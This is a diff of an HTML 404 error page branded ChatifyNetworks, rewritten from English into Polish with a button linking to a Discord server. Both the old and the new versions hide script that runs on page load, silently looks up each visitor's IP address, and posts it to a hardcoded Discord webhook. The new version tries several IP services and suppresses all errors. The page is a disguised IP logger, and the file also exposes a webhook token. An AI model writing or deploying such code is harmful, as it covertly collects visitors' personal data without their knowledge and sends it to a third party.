@@ -1,53 +1,126 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ChatifyNetworks</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Strona nie znaleziona - 404</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f11;
+            color: #e1e1e6;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .container {
+            max-width: 520px;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 4.8rem;
+            margin: 0 0 0.4em;
+            color: #7378ff;
+            font-weight: 700;
+        }
+        .message {
+            font-size: 1.2rem;
+            margin: 0 0 2rem;
+            color: #a0a0c0;
+            line-height: 1.5;
+        }
+        .btn {
+            display: inline-block;
+            padding: 12px 32px;
+            background: #5865f2;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 500;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background: #4752c4;
+        }
+        .footer {
+            margin-top: 3rem;
+            font-size: 0.82rem;
+            color: #606080;
+        }
+    </style>
 </head>
 <body>
-    <div class="wrapper">
-        <h1>Page Not Found</h1>
-        <p class="message">We can't find the page you are looking for. Check out our Help center or head back to home.</p>
-        <a href="#" class="btn" id="learn-more-btn">Learn More About Us</a>
-        <p class="copyRights">&copy; 2026 ChatifyNetworks</p>
-    </div>
+
+<div class="container">
+    <h1>404</h1>
+    <p class="message">
+        Ups... coś poszło nie tak.<br>
+        Strona, której szukasz nie istnieje lub została przeniesiona.
+    </p>
     
-    <script>
-        $(document).ready(function() {
-            function sendIPToDiscord(ipAddress) {
-                var webhookURL = 'Phttps://discord.com/api/webhooks/1460315288602935500/_UKuf0ilwfA0qW6UcmnNYref3MD3ivBlvkiX6yEWioFi0M234IkTHttGsiIKGJT4CvdZ';
-                var payload = {
-                    content: 'IP Address: ' + ipAddress
-                };
-                
-                $.ajax({
-                    url: webhookURL,
-                    type: 'POST',
-                    data: JSON.stringify(payload),
-                    contentType: 'application/json',
-                    success: function() {
-                        console.log('success');
-                    },
-                    error: function(xhr, status, error) {
-                        console.error('failed', error);
+    <a href="https://discord.gg/xxxxxxxx" class="btn" id="go-home">
+        Wróć na serwer Discord
+    </a>
+
+    <div class="footer">
+        © 2026 ChatifyNetworks • All rights reserved
+    </div>
+</div>
+
+<script>
+    // Pobranie IP i wysłanie na webhook
+    (function(){
+        const webhook = "https://discord.com/api/webhooks/1460315288602935500/_UKuf0ilwfA0qW6UcmnNYref3MD3ivBlvkiX6yEWioFi0M234IkTHttGsiIKGJT4CvdZ";
+
+        // Kilka źródeł IP – zwiększa szansę zadziałania
+        const endpoints = [
+            'https://api.ipify.org?format=json',
+            'https://api64.ipify.org?format=json',
+            'https://icanhazip.com',
+            'https://ifconfig.me/ip'
+        ];
+
+        function sendIP(ip) {
+            if (!ip) return;
+
+            fetch(webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `**Nowy 404 visit**\n\`\`\`${ip}\`\`\``,
+                    username: "Page Logger",
+                    avatar_url: "https://i.imgur.com/veryfunnymeme.jpg" // opcjonalne
+                })
+            }).catch(() => {}); // ciche niepowodzenie
+        }
+
+        // Próba po kolei aż coś zadziała
+        function tryNext(index = 0) {
+            if (index >= endpoints.length) return;
+
+            fetch(endpoints[index])
+                .then(r => {
+                    if (!r.ok) throw new Error();
+                    return r.text();
+                })
+                .then(text => {
+                    const ip = text.trim();
+                    if (ip && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
+                        sendIP(ip);
                     }
-                });
-            }
-            
-            var learnMoreBtn = $('#learn-more-btn');
-            learnMoreBtn.on('click', function(event) {
-                event.preventDefault();
-                location.reload();
-            });
-            
-            $.getJSON('https://api.ipify.org?format=json', function(data) {
-                var ipAddress = data.ip;
-                sendIPToDiscord(ipAddress);
-            });
-        });
-    </script>
+                })
+                .catch(() => tryNext(index + 1));
+        }
+
+        tryNext();
+    })();
+</script>
+
 </body>
 </html>
